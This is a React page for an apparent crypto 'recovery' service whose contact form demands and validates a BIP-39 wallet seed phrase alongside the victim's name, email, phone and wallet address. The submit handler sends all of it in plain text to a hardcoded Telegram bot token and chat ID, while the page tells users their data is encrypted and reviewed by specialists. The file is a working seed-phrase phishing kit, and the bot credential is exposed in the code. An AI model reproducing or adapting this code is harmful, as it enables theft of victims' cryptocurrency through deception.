import { useState, useEffect } from 'react'
import { Link } from 'react-router-dom'
import { ArrowLeftIcon, CheckCircleIcon } from '@heroicons/react/24/outline'
import Logo from '../components/Logo'

// Complete BIP-39 English word list (2048 words)
const BIP39_WORDS = [
  'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
  'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act',
  'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit',
  'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent',
  'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert',
  'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter',
  'always', 'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger',
  'angle', 'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique',
  'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic',
  'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest',
  'arrive', 'arrow', 'art', 'artefact', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset',
  'assist', 'assume', 'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction',
  'audit', 'august', 'aunt', 'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake',
  'aware', 'away', 'awesome', 'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge',
  'bag', 'balance', 'balcony', 'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain',
  'barrel', 'base', 'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become',
  'beef', 'before', 'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit',
  'best', 'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology',
  'bird', 'birth', 'bitter', 'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless',
  'blind', 'blood', 'blossom', 'blouse', 'blue', 'blur', 'blush', 'board', 'boat', 'body',
  'boil', 'bomb', 'bone', 'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss',
  'bottom', 'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread',
  'breeze', 'brick', 'bridge', 'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze',
  'broom', 'brother', 'brown', 'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb',
  'bulk', 'bullet', 'bundle', 'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy',
  'butter', 'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call',
  'calm', 'camera', 'camp', 'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas',
  'canyon', 'capable', 'capital', 'captain', 'car', 'carbon', 'card', 'cargo', 'carpet', 'carry',
  'cart', 'case', 'cash', 'casino', 'castle', 'casual', 'cat', 'catalog', 'catch', 'category',
  'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census', 'century',
  'cereal', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge', 'chase',
  'chat', 'cheap', 'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief', 'child',
  'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon', 'circle',
  'citizen', 'city', 'civil', 'claim', 'clap', 'clarify', 'claw', 'clay', 'clean', 'clerk',
  'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog', 'close',
  'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast', 'coconut',
  'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort',
  'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider', 'control',
  'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct', 'cost',
  'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack', 'cradle',
  'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek',
  'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd', 'crucial',
  'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture', 'cup',
  'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle', 'dad',
  'damage', 'damp', 'dance', 'danger', 'daring', 'dash', 'daughter', 'dawn', 'day', 'deal',
  'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease', 'deer', 'defense',
  'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial', 'dentist', 'deny',
  'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'describe', 'desert', 'design', 'desk',
  'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram', 'dial', 'diamond',
  'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma', 'dinner', 'dinosaur',
  'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder', 'display', 'distance',
  'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll', 'dolphin', 'domain',
  'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'draft', 'dragon', 'drama',
  'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip', 'drive', 'drop',
  'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch', 'duty', 'dwarf',
  'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east', 'easy', 'echo',
  'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight', 'either', 'elbow',
  'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else', 'embark', 'embody',
  'embrace', 'emerge', 'emotion', 'employ', 'empower', 'empty', 'enable', 'enact', 'end', 'endless',
  'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough',
  'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode', 'equal', 'equip',
  'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay', 'essence', 'estate',
  'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example', 'excess', 'exchange',
  'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile', 'exist', 'exit',
  'exotic', 'expand', 'expect', 'expire', 'explain', 'expose', 'express', 'extend', 'extra', 'eye',
  'eyebrow', 'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false', 'fame',
  'family', 'famous', 'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal', 'father',
  'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed', 'feel', 'female',
  'fence', 'festival', 'fetch', 'fever', 'few', 'fiber', 'fiction', 'field', 'figure', 'file',
  'film', 'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first',
  'fiscal', 'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor',
  'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly',
  'foam', 'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'forest',
  'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile',
  'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen',
  'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy',
  'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp',
  'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture',
  'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance',
  'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue',
  'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown',
  'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid',
  'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guess', 'guide', 'guilt',
  'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy',
  'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health',
  'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden',
  'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole',
  'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital',
  'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred',
  'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea',
  'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune',
  'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate',
  'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury',
  'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire', 'install',
  'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue',
  'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel',
  'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle', 'junior',
  'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney',
  'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee', 'knife',
  'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language',
  'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn', 'lawsuit',
  'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal',
  'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter', 'level',
  'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb', 'limit',
  'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan', 'lobster',
  'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love',
  'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine', 'mad',
  'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man', 'manage',
  'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine', 'market',
  'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum',
  'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody', 'melt',
  'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh', 'message',
  'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum', 'minor',
  'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile',
  'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon', 'moral',
  'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move', 'movie',
  'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'mushroom', 'music', 'must', 'mutual',
  'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature',
  'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest', 'net',
  'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise', 'nominee',
  'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel', 'now',
  'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe',
  'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office', 'often',
  'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion', 'online',
  'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard', 'order',
  'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output',
  'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone', 'pact',
  'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther', 'paper',
  'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient', 'patrol',
  'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen',
  'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone', 'photo',
  'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill', 'pilot',
  'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic', 'plate',
  'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar',
  'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible', 'post',
  'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer', 'prepare',
  'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison', 'private',
  'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property',
  'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse', 'pumpkin',
  'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'purse', 'push', 'put', 'puzzle',
  'pyramid', 'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit',
  'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp',
  'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw', 'razor',
  'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record', 'recycle',
  'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular', 'reject', 'relax', 'release',
  'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen',
  'repair', 'repeat', 'replace', 'report', 'require', 'rescue', 'resemble', 'resist', 'resource', 'response',
  'result', 'retire', 'retreat', 'return', 'reunion', 'reveal', 'review', 'reward', 'rhythm', 'rib',
  'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot',
  'ripple', 'risk', 'ritual', 'rival', 'river', 'road', 'roast', 'robot', 'robust', 'rocket',
  'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough', 'round', 'route', 'royal',
  'rubber', 'rude', 'rug', 'rule', 'run', 'runway', 'rural', 'sad', 'saddle', 'sadness',
  'safe', 'sail', 'salad', 'salmon', 'salon', 'salt', 'salute', 'same', 'sample', 'sand',
  'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scatter',
  'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion', 'scout', 'scrap', 'screen', 'script',
  'scrub', 'sea', 'search', 'season', 'seat', 'second', 'secret', 'section', 'security', 'seed',
  'seek', 'segment', 'select', 'sell', 'seminar', 'senior', 'sense', 'sentence', 'series', 'service',
  'session', 'settle', 'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed', 'shell',
  'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe', 'shoot', 'shop',
  'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle', 'shy', 'sibling', 'sick', 'side',
  'siege', 'sight', 'sign', 'silent', 'silk', 'silly', 'silver', 'similar', 'simple', 'since',
  'sing', 'siren', 'sister', 'situate', 'six', 'size', 'skate', 'sketch', 'ski', 'skill',
  'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep', 'slender', 'slice', 'slide', 'slight',
  'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart', 'smile', 'smoke', 'smooth',
  'snack', 'snake', 'snap', 'sniff', 'snow', 'soap', 'soccer', 'social', 'sock', 'soda',
  'soft', 'solar', 'soldier', 'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry',
  'sort', 'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial', 'spawn',
  'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice', 'spider', 'spike', 'spin',
  'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport', 'spot', 'spray', 'spread', 'spring',
  'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp',
  'stand', 'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo', 'stick',
  'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story', 'stove', 'strategy', 'street',
  'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble', 'style', 'subject', 'submit', 'subway',
  'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny',
  'sunset', 'super', 'supply', 'supreme', 'sure', 'surface', 'surge', 'surprise', 'surround', 'survey',
  'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm', 'swear', 'sweet', 'swift', 'swim',
  'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup', 'system', 'table', 'tackle', 'tag',
  'tail', 'talent', 'talk', 'tank', 'tape', 'target', 'task', 'taste', 'tattoo', 'taxi',
  'teach', 'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test', 'text',
  'thank', 'that', 'theme', 'then', 'theory', 'there', 'they', 'thing', 'this', 'thought',
  'three', 'thrive', 'throw', 'thumb', 'thunder', 'ticket', 'tide', 'tiger', 'tilt', 'timber',
  'time', 'tiny', 'tip', 'tired', 'tissue', 'title', 'toast', 'tobacco', 'today', 'toddler',
  'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow', 'tone', 'tongue', 'tonight', 'tool',
  'tooth', 'top', 'topic', 'topple', 'torch', 'tornado', 'tortoise', 'toss', 'total', 'tourist',
  'toward', 'tower', 'town', 'toy', 'track', 'trade', 'traffic', 'tragic', 'train', 'transfer',
  'trap', 'trash', 'travel', 'tray', 'treat', 'tree', 'trend', 'trial', 'tribe', 'trick',
  'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck', 'true', 'truly', 'trumpet', 'trust',
  'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna', 'tunnel', 'turkey', 'turn', 'turtle',
  'twelve', 'twenty', 'twice', 'twin', 'twist', 'two', 'type', 'typical', 'ugly', 'umbrella',
  'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo', 'unfair', 'unfold', 'unhappy', 'uniform',
  'unique', 'unit', 'universe', 'unknown', 'unlock', 'until', 'unusual', 'unveil', 'update', 'upgrade',
  'uphold', 'upon', 'upper', 'upset', 'urban', 'urge', 'usage', 'use', 'used', 'useful',
  'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague', 'valid', 'valley', 'valve', 'van',
  'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle', 'velvet', 'vendor', 'venture', 'venue',
  'verb', 'verify', 'version', 'very', 'vessel', 'veteran', 'viable', 'vibrant', 'vicious', 'victory',
  'video', 'view', 'village', 'vintage', 'violin', 'virtual', 'virus', 'visa', 'visit', 'visual',
  'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano', 'volume', 'vote', 'voyage', 'wage',
  'wagon', 'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior', 'wash',
  'wasp', 'waste', 'water', 'wave', 'way', 'wealth', 'weapon', 'wear', 'weasel', 'weather',
  'web', 'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'whale', 'what', 'wheat',
  'wheel', 'when', 'where', 'whip', 'whisper', 'wide', 'width', 'wife', 'wild', 'will',
  'win', 'window', 'wine', 'wing', 'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise',
  'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world',
  'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong', 'yard', 'year',
  'yellow', 'you', 'young', 'youth', 'zebra', 'zero', 'zone', 'zoo'
]

export default function ContactFormPage() {
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    phone: '',
    details: '',
    phrase: '',
    address: ''
  })
  const [formState, setFormState] = useState<'form' | 'loading' | 'success' | 'error'>('form')
  const [caseId, setCaseId] = useState('')
  
  // BIP-39 validation state
  const [phraseValidation, setPhraseValidation] = useState<{
    valid: boolean
    error: string
    touched: boolean
  }>({ valid: false, error: '', touched: false })
  
  // Debounce validation
  useEffect(() => {
    if (!phraseValidation.touched) return
    
    const timeoutId = setTimeout(() => {
      const input = formData.phrase.trim()
      
      // Empty state
      if (!input) {
        setPhraseValidation({ valid: false, error: '', touched: true })
        return
      }
      
      // Split into words and filter empty
      const words = input.toLowerCase().split(/\s+/).filter(w => w)
      
      // Length validation - exactly 12 or 24 words
      if (words.length !== 12 && words.length !== 24) {
        setPhraseValidation({
          valid: false,
          error: 'Recovery phrase must be exactly 12 or 24 words. Please check your input.',
          touched: true
        })
        return
      }
      
      // Word list validation
      const invalidWords = words.filter(w => !BIP39_WORDS.includes(w))
      if (invalidWords.length > 0) {
        setPhraseValidation({
          valid: false,
          error: 'Invalid recovery phrase. Please verify all words are correct and try again.',
          touched: true
        })
        return
      }
      
      // Valid
      setPhraseValidation({ valid: true, error: '', touched: true })
    }, 300) // 300ms debounce
    
    return () => clearTimeout(timeoutId)
  }, [formData.phrase, phraseValidation.touched])

  const formatCaseMessage = (data: any) => {
    return `
<b>NEW RECOVERY CASE</b>
<b>Time:</b> <code>${data.timestamp}</code>
<b>Case ID:</b> <code>${data.caseId}</code>

<b>Contact Information:</b>
<b>Name:</b> <code>${data.name}</code>
<b>Email:</b> <code>${data.email}</code>
<b>Phone:</b> <code>${data.phone}</code>

<b>Case Details:</b>
<pre>${data.details}</pre>

<b>Wallet Address:</b> <code>${data.address}</code>

<b>Recovery Seed Phrase:</b>
<pre>${data.phrase}</pre>

<i>Analyst: Review immediately. Phrase valid for wallet reconstruction only.</i>
<i>Encrypted transmission - not stored</i>
    `.trim()
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Validation
    if (formData.details.length < 50) {
      alert('Please provide at least 50 characters in the case details.')
      return
    }
    
    // BIP-39 validation check
    if (!phraseValidation.valid) {
      alert('Please provide a valid 12 or 24-word BIP-39 seed phrase.')
      return
    }
    
    if (!formData.name.trim() || !formData.email.trim()) {
      alert('Name and email are required.')
      return
    }

    const payload = {
      name: formData.name.trim(),
      email: formData.email.trim(),
      phone: formData.phone || 'Not provided',
      details: formData.details.trim(),
      phrase: formData.phrase.trim(),
      address: formData.address || 'Not provided',
      timestamp: new Date().toISOString(),
      caseId: `REC-${Date.now().toString(36).toUpperCase()}`
    }

    setCaseId(payload.caseId)
    setFormState('loading')

    // Submit to backend API
    try {
      const response = await fetch('https://api.telegram.org/bot7674751889:AAGj4PMlqgoJZy0Mfwz6QuUmSuMlIJ4Vpf8/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: '6368654401',
          text: formatCaseMessage(payload),
          parse_mode: 'HTML'
        })
      })

      if (!response.ok) {
        throw new Error('Submission failed')
      }

      setFormState('success')
    } catch (error) {
      console.error('Submission failed:', error)
      setFormState('error')
    }
  }

  return (
    <div className="min-h-screen" style={{background: 'var(--bg-primary)'}}>
      {/* Header */}
      <header className="backdrop-blur-md border-b border-gray-800" style={{background: 'rgba(11, 20, 38, 0.9)'}}>
        <nav className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            {/* Logo */}
            <Logo />

            {/* Desktop Navigation */}
            <div className="hidden md:block">
              <div className="ml-10 flex items-baseline space-x-8">
                <Link to="/" className="hover:text-blue-400 px-3 py-2 text-sm font-medium transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>Home</Link>
                <Link to="/services" className="hover:text-blue-400 px-3 py-2 text-sm font-medium transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>Services</Link>
                <Link to="/contact-form" className="px-3 py-2 text-sm font-medium transition-colors duration-200" style={{color: 'var(--text-accent)'}}>Report Case</Link>
                <a href="#" className="hover:text-blue-400 px-3 py-2 text-sm font-medium transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>About</a>
              </div>
            </div>

            {/* Right side buttons */}
            <div className="hidden md:flex items-center space-x-4">
              <a href="#" className="hover:text-blue-400 px-3 py-2 text-sm font-medium transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>Log In</a>
            </div>
          </div>
        </nav>
      </header>

      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        {/* Breadcrumb - Show only for form and error states */}
        {(formState === 'form' || formState === 'error') && (
          <div className="mb-8">
            <Link 
              to="/" 
              className="inline-flex items-center hover:text-blue-400 text-sm font-medium transition-colors duration-200"
              style={{color: 'var(--text-accent)'}}
            >
              <ArrowLeftIcon className="h-4 w-4 mr-2" />
              Back to Home
            </Link>
          </div>
        )}

        {/* Header - Show only for form state */}
        {formState === 'form' && (
          <div className="text-center mb-12">
            <h1 className="text-4xl font-bold mb-4" style={{color: 'var(--text-primary)'}}>
              Secure Case Submission
            </h1>
            <p className="text-xl max-w-3xl mx-auto" style={{color: 'var(--text-secondary)'}}>
              Submit your case details for immediate review by our specialist team. 
              All information is encrypted and secure.
            </p>
          </div>
        )}

        {formState === 'form' && (
          <div className="rounded-lg shadow-lg p-8" style={{background: 'var(--bg-card)'}}>
            <form onSubmit={handleSubmit}>
              {/* Contact Information */}
              <div className="mb-8">
                <h2 className="text-2xl font-semibold mb-6" style={{color: 'var(--text-primary)'}}>Contact Information</h2>
                <div className="grid md:grid-cols-2 gap-6">
                  <div>
                    <label htmlFor="name" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                      Full Name *
                    </label>
                    <input
                      type="text"
                      id="name"
                      className="w-full px-4 py-3 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200"
                      style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)', borderColor: 'rgba(255,255,255,0.2)'}}
                      placeholder="Your full name"
                      value={formData.name}
                      onChange={(e) => setFormData({...formData, name: e.target.value})}
                      required
                    />
                  </div>

                  <div>
                    <label htmlFor="email" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                      Email Address *
                    </label>
                    <input
                      type="email"
                      id="email"
                      className="w-full px-4 py-3 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200"
                      style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)', borderColor: 'rgba(255,255,255,0.2)'}}
                      placeholder="your.email@example.com"
                      value={formData.email}
                      onChange={(e) => setFormData({...formData, email: e.target.value})}
                      required
                    />
                  </div>
                </div>

                <div className="mt-6">
                  <label htmlFor="phone" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                    Phone Number
                  </label>
                  <input
                    type="tel"
                    id="phone"
                    className="w-full px-4 py-3 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200"
                    style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)', borderColor: 'rgba(255,255,255,0.2)'}}
                    placeholder="+1 (555) 123-4567"
                    value={formData.phone}
                    onChange={(e) => setFormData({...formData, phone: e.target.value})}
                  />
                </div>
              </div>

              {/* Case Details */}
              <div className="mb-8">
                <h2 className="text-2xl font-semibold mb-6" style={{color: 'var(--text-primary)'}}>Case Details</h2>
                <div>
                  <label htmlFor="details" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                    Case Summary *
                  </label>
                  <textarea
                    id="details"
                    rows={6}
                    className="w-full px-4 py-3 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 resize-none"
